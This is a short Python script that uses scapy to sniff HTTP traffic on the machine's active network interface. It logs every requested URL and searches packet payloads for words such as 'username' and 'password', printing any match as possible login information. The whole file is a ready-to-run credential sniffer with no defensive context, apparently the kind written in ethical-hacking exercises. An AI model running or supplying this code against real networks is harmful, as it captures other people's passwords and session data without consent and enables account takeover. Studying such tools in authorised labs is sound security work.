import scapy.all as scapy
from scapy.layers import http
from interface_fetcher import get_active_interface

# Function to sniff packets
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

# Function to extract URL from packet
def get_url(packet):
    host = packet[http.HTTPRequest].Host.decode("utf-8", errors="ignore") if hasattr(packet[http.HTTPRequest], "Host") else ""
    path = packet[http.HTTPRequest].Path.decode("utf-8", errors="ignore") if hasattr(packet[http.HTTPRequest], "Path") else ""
    return host + path

# Function to extract login information from packet
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        # Check for sensitive keywords
        keywords = ["username", "user", "password", "login", "pass"]
        for keyword in keywords:
            if keyword.lower() in load.lower():  # Case-insensitive match
                return load  # Return the decoded string if it contains sensitive data
    return None

# Process sniffed packets
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>> " + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Login Info: ", login_info)

# Replace with the correct network interface name
sniff(get_active_interface())
